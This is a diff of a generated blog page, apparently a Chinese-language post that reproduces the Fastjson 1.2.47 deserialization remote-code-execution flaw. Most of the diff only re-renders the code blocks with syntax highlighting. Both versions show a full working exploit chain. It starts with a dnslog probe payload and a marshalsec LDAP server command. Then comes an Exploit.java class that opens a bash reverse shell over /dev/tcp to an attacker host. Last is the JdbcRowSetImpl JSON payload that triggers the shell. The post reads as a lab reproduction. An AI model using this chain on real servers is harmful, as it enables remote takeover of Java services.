@@ -27,7 +27,7 @@
 <meta property="og:image" content="http://klforever.cn/images/15/7.png">
 <meta property="og:image" content="http://klforever.cn/images/15/8.png">
 <meta property="og:image" content="http://klforever.cn/images/15/9.png">
-<meta property="og:updated_time" content="2021-04-08T15:35:01.082Z">
+<meta property="og:updated_time" content="2021-04-25T09:04:28.483Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Fastjson 反序列化漏洞复现">
 <meta name="twitter:description" content="Fastjson是什么 Fastjson是阿里巴巴开源JSON解析库，他可以解析JSON格式的字符串。支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。  Fastjson提供了autotype功能，在请求过程中，我们可以在请求包中通过修改@type的值，来反序列化为指定的类型，而fastjson在反序列化过程中会设置和获取类中的属性，如果类中存在恶">
@@ -54,14 +54,15 @@
 
   
     
- 	  <script src="/lib/clickLove.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+ 	  <script src="/lib/clickLove.js"></script>
   
   
 
 
   
 
-</head>
+<link rel="stylesheet" href="/css/prism-hopscotch.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
 
 <body>
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container" q-class="show:isCtnShow">
@@ -228,7 +229,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">584字</span>
+      <span class="post-count">537字</span>
     </span>
   </span>
 
@@ -260,61 +261,68 @@
 </ul>
 <p>RCE：<a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
 <h3 id="探测能否利用"><a href="#探测能否利用" class="headerlink" title="探测能否利用"></a>探测能否利用</h3><p>payload：</p>
-<pre><code>{
-    &quot;name&quot;:&quot;menghao&quot;,
-    &quot;age&quot;:12
-}</code></pre><p>如果Response返回了相应的结果即代表着参数被解析了，即可进行下一步。<br><img src="/images/15/1.png" alt></p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">{</span>
+    <span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"menghao"</span><span class="token punctuation">,</span>
+    <span class="token string">"age"</span><span class="token punctuation">:</span><span class="token number">12</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如果Response返回了相应的结果即代表着参数被解析了，即可进行下一步。<br><img src="/images/15/1.png" alt></p>
 <p>探测目标机是否出网（dnslog）</p>
-<pre><code>{
-    &quot;zeo&quot;:{
-        &quot;@type&quot;:&quot;java.net.Inet4Address&quot;,
-        &quot;val&quot;:&quot;aaa.bcxmn7.dnslog.cn&quot;
-    }
-}</code></pre><p><img src="/images/15/2.png" alt></p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">{</span>
+    <span class="token string">"zeo"</span><span class="token punctuation">:</span><span class="token punctuation">{</span>
+        <span class="token string">"@type"</span><span class="token punctuation">:</span><span class="token string">"java.net.Inet4Address"</span><span class="token punctuation">,</span>
+        <span class="token string">"val"</span><span class="token punctuation">:</span><span class="token string">"aaa.bcxmn7.dnslog.cn"</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/15/2.png" alt></p>
 <h3 id="准备LDAP服务"><a href="#准备LDAP服务" class="headerlink" title="准备LDAP服务"></a>准备LDAP服务</h3><p><strong>将marshalsec-0.0.3-SNAPSHOT-all.jar文件和Exploit.java放在同一目录下</strong><br>在当前目录下运行LDAP服务,修改IP为当前这台服务器的IP</p>
-<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.30.16:1111/#Exploit 9999</code></pre><p><img src="/images/15/3.png" alt></p>
+<pre class="line-numbers language-java"><code class="language-java">java <span class="token operator">-</span>cp marshalsec<span class="token operator">-</span><span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">3</span><span class="token operator">-</span>SNAPSHOT<span class="token operator">-</span>all<span class="token punctuation">.</span>jar marshalsec<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>LDAPRefServer http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">30.16</span><span class="token operator">:</span><span class="token number">1111</span><span class="token operator">/</span>#Exploit <span class="token number">9999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/15/3.png" alt></p>
 <h3 id="准备Web服务"><a href="#准备Web服务" class="headerlink" title="准备Web服务"></a>准备Web服务</h3><p>在当前目录下使用python搭建Web服务</p>
-<pre><code>python -m http.server 1111</code></pre><p><img src="/images/15/4.png" alt></p>
+<pre class="line-numbers language-java"><code class="language-java">python <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">1111</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/15/4.png" alt></p>
 <h3 id="修改Exploit并编译成class文件"><a href="#修改Exploit并编译成class文件" class="headerlink" title="修改Exploit并编译成class文件"></a>修改Exploit并编译成class文件</h3><p>修改Exploit.java中的反弹IP和端口（准备接收反弹SHELL的服务器IP和监听端口）</p>
 <p>Exploit.java</p>
-<pre><code>import java.io.BufferedReader;
-import java.io.InputStream;
-import java.io.InputStreamReader;
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedReader<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStreamReader<span class="token punctuation">;</span>
 
-public class Exploit{
-    public Exploit() throws Exception {
-        Process p = Runtime.getRuntime().exec(new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.30.16/1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;});
-        InputStream is = p.getInputStream();
-        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token function">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        Process p <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/192.168.30.16/1888;cat &lt;&amp;5 | while read line; do $line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        InputStream is <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        BufferedReader reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        String line;
-        while((line = reader.readLine()) != null) {
-            System.out.println(line);
-        }
+        String line<span class="token punctuation">;</span>
+        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
 
-        p.waitFor();
-        is.close();
-        reader.close();
-        p.destroy();
-    }
+        p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        reader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        p<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-    public static void main(String[] args) throws Exception {
-    }
-}</code></pre><p><img src="/images/15/5.png" alt></p>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/15/5.png" alt></p>
 <p>编译Exploit.java</p>
-<pre><code>javac Exploit.java</code></pre><p><img src="/images/15/6.png" alt></p>
-<h3 id="使用EXP获取Shell"><a href="#使用EXP获取Shell" class="headerlink" title="使用EXP获取Shell"></a>使用EXP获取Shell</h3><pre><code>{
-    &quot;name&quot;:{
-        &quot;@type&quot;:&quot;java.lang.Class&quot;,
-        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
-    },
-    &quot;x&quot;:{
-        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
-        &quot;dataSourceName&quot;:&quot;ldap://192.168.30.16:9999/Exploit&quot;,
-        &quot;autoCommit&quot;:true
-    }
+<pre class="line-numbers language-java"><code class="language-java">javac Exploit<span class="token punctuation">.</span>java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/15/6.png" alt></p>
+<h3 id="使用EXP获取Shell"><a href="#使用EXP获取Shell" class="headerlink" title="使用EXP获取Shell"></a>使用EXP获取Shell</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">{</span>
+    <span class="token string">"name"</span><span class="token operator">:</span><span class="token punctuation">{</span>
+        <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
+        <span class="token string">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span>
+    <span class="token string">"x"</span><span class="token operator">:</span><span class="token punctuation">{</span>
+        <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
+        <span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://192.168.30.16:9999/Exploit"</span><span class="token punctuation">,</span>
+        <span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
+    <span class="token punctuation">}</span>
 
-}</code></pre><p>静等shell<del>~</del>(复现时虚拟机ping不通物理机时关闭本机防火墙即可)<br><img src="/images/15/7.png" alt><br><img src="/images/15/8.png" alt></p>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>静等shell<del>~</del>(复现时虚拟机ping不通物理机时关闭本机防火墙即可)<br><img src="/images/15/7.png" alt><br><img src="/images/15/8.png" alt></p>
 <h3 id="Burp-自动探测Fastjson反序列化-脚本"><a href="#Burp-自动探测Fastjson反序列化-脚本" class="headerlink" title="Burp 自动探测Fastjson反序列化 脚本"></a>Burp 自动探测Fastjson反序列化 脚本</h3><p><a href="https://github.com/Maskhe/FastjsonScan" target="_blank" rel="noopener">https://github.com/Maskhe/FastjsonScan</a></p>
 <p>在平时抓包时右键 Send FastjsonScan 即可探测是否存在。<br><img src="/images/15/9.png" alt></p>
 
